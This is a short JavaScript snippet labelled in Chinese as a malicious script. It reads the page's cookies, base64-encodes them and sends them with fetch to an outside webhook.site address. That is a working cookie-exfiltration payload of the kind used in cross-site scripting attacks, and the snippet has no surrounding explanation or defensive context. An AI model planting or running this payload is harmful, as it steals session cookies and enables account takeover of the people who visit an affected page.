// 惡意 script
var cookie = document.cookie;
fetch(
  "https://webhook.site/6f6faf51-a953-48cf-8259-d264a2822efa?" +
    window.btoa(cookie)
);
